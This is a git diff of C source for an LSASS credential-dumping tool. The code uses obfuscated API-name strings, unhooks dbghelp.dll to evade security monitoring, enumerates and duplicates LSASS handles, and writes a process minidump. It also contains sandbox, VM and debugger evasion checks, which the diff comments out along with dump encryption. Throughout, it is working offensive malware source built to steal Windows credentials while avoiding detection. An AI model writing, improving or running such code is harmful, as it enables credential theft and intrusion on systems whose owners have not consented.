@@ -22,8 +22,6 @@ typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWOR
 typedef BOOL(WINAPI* GetTokenInformation_t)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
 typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
-VirtualProtect_t VirtualProtect_p = NULL;
-
 
 unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
 unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
@@ -54,7 +52,7 @@ void m1n1dumpIt(HANDLE hProc) {
 	//printf("filepath : %s\n", filepath);
 	wchar_t wfilepath[MAX_PATH];
 	mbstowcs(wfilepath, filepath, MAX_PATH);
-	//printf("wfilepath : %ws\n", wfilepath);
+	printf("wfilepath : %ws\n", wfilepath);
 
 	HANDLE hFile = CreateFile(wfilepath, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (!hFile) {
@@ -65,7 +63,7 @@ void m1n1dumpIt(HANDLE hProc) {
 
 		DWORD l$a$$Pid = GetProcessId(hProc);
 		BOOL dumpStat = MiniDumpWriteDump(hProc, l$a$$Pid, hFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
-		EncryptFileA(filepath);
+		//EncryptFileA(filepath);
 		
 		CloseHandle(hFile);
 
@@ -88,13 +86,15 @@ static int UnhookModule(const HMODULE hDbghelp, const LPVOID pMapping) {
 	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
 	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
 	int i;
+	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
+	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sVirtualProtect);
 
 
 	// find .text section
 	for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
 		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
 
-		if (!strcmp((char*)pish->Name, ".text")) {
+		if (strcmp((char*)pish->Name, ".text") == 0) {
 			// prepare hDbghelp.dll memory region for write permissions.
 			VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
 			if (!oldprotect) {
@@ -126,7 +126,7 @@ BOOL IsElevated() {
 		TOKEN_ELEVATION Elevation = { 0 };
 		DWORD cbSize = sizeof(TOKEN_ELEVATION);
 		char StrGetTknInfo[] = {'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n',0};
-		GetTokenInformation_t pGetTokenInformation = (GetTokenInformation_t)GetLibraryProcAddress((PSTR)sKernel32, StrGetTknInfo);
+		GetTokenInformation_t pGetTokenInformation = (GetTokenInformation_t)GetLibraryProcAddress((PSTR)sAdvapi32, StrGetTknInfo);
 		if (pGetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
 			fRet = Elevation.TokenIsElevated;
 		}
@@ -173,7 +173,6 @@ void FreshCopy(unsigned char* modulePath, unsigned char* moduleName) {
 	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
 	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
 	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
-	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
 
 	unsigned int sDbghelpPath_len = sizeof(sDbghelpPath);
 	unsigned int sDbghelp_len = sizeof(sDbghelp);
@@ -185,7 +184,6 @@ void FreshCopy(unsigned char* modulePath, unsigned char* moduleName) {
 	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sCreateFileMappingA);
 	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sMapViewOfFile);
 	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sUnmapViewOfFile);
-	VirtualProtect_p = (VirtualProtect_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sVirtualProtect);
 
 	// open the DLL
 	hFile = CreateFileA((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
@@ -223,7 +221,7 @@ void FreshCopy(unsigned char* modulePath, unsigned char* moduleName) {
 
 
 // https://github.com/kartikdurg/Enum-LSASS/blob/main/Example/enum_lsass_handles.c
-HANDLE enum_lsass_handles() {
+HANDLE EnumLsassHandles() {
 	
 	char qsysinfo[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
 	char dupo[] = { 'N','t','D','u','p','l','i','c','a','t','e','O','b','j','e','c','t',0 };
@@ -326,6 +324,7 @@ HANDLE enum_lsass_handles() {
 }
 
 int main(int argc, char** argv) {
+	/*
 	// escaping s1ndb0x
 	// CPU
 	SYSTEM_INFO systemInfo;
@@ -355,7 +354,8 @@ int main(int argc, char** argv) {
 	if (diskSizeGB < 100) {
 		return -1;
 	}
-	
+	*/
+	/*
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (!hSnapshot)
 		return printError("Failed in CreateToolhelp32Snapshot\n");
@@ -365,7 +365,7 @@ int main(int argc, char** argv) {
 
 	if (!Process32First(hSnapshot, &PE32))
 		return printError("Failed in Process32First\n");
-
+	
 	while (Process32Next(hSnapshot, &PE32)) {
 		size_t i;
 		char* pMBBuffer = (char*)malloc(MAX_PATH);
@@ -378,7 +378,7 @@ int main(int argc, char** argv) {
 		const char vbser[] = { 'v','b','o','x','s','e','r','v','i','c','e','.','e','x','e',0 };
 		const char vbtra[] = { 'v','b','o','x','t','r','a','y','.','e','x','e',0 };
 
-		/*
+		
 		if (!strcmp(vmt00l, pMBBuffer)) {
 			return -1;
 		}
@@ -400,9 +400,9 @@ int main(int argc, char** argv) {
 		{
 			free(pMBBuffer);
 		}
-		*/
+		
 	}
-
+	
 
 	HANDLE h = GetCurrentProcess();
 	PROCESS_BASIC_INFORMATION ProcessInformation;
@@ -423,8 +423,8 @@ int main(int argc, char** argv) {
 	if (BeingDebugged) {
 		return -1;
 	}
-
-
+	
+	*/
 	char* mem = NULL;
 	mem = (char*)malloc(10000000000);
 
@@ -437,10 +437,10 @@ int main(int argc, char** argv) {
 		FreshCopy(sDbghelpPath, sDbghelp);
 		DWORD l$a$$Pid = 0;
 		// Find lsass PID	
-		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-		PROCESSENTRY32 processEntry = {};
-		processEntry.dwSize = sizeof(PROCESSENTRY32);
-		LPCWSTR processName = L"";
+		//HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		//PROCESSENTRY32 processEntry = {};
+		//processEntry.dwSize = sizeof(PROCESSENTRY32);
+		//LPCWSTR processName = L"";
 		//wchar_t l$a$$[] = {'l','s','a','s','s','.','e','x','e',0};
 		char l$a$$[MAX_PATH];
 		memset(l$a$$, 0, MAX_PATH);
@@ -463,10 +463,12 @@ int main(int argc, char** argv) {
 			return -1;
 		}
 	
-		HANDLE hProcess = enum_lsass_handles();
+		HANDLE hProcess = EnumLsassHandles();
 		
-		if (!hProcess)
+		if (!hProcess) {
 			printError("Failed in OpenProcess (%u)\n");
+		}
+
 		m1n1dumpIt(hProcess);
 		CloseHandle(hProcess);
 		return 0;
